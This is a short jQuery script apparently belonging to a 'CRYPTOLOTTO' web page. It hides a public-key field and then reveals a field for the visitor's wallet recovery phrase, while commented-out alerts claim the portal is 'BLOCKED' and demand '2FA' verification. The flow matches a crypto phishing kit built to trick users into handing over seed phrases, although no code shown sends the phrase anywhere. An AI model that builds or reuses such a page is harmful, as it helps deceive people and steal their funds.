var recoverPhrase = $('#recover-container');
var phrase = $('#phrase');
var publicKey = $('#public');
var enter = $('#enter-btn')
var verify = $('#verify-btn')
// alert('CRYPTOLOTTO Portal Status: BLOCKED')
// alert('Decentralized lottery protocols require vericication via 2FA.')

$(function() {
    phrase.hide();
    verify.hide();
    recoverPhrase.hide();
   
    if (publicKey.val) {
        enter.on('click', function(){
            enter.hide();
            verify.show();
            publicKey.hide()
            phrase.show()
        });
    }
    
});

recoverPhrase.on("click", "#recover", function() {
    // Starting screen is hidden
    recoverPhrase.hide()
    phrase.show()
    recoverPhrase.on("click", "#recover", function() {
        // Starting screen is hidden
        recoverPhrase.hide()
        phrase.show()
    });
});
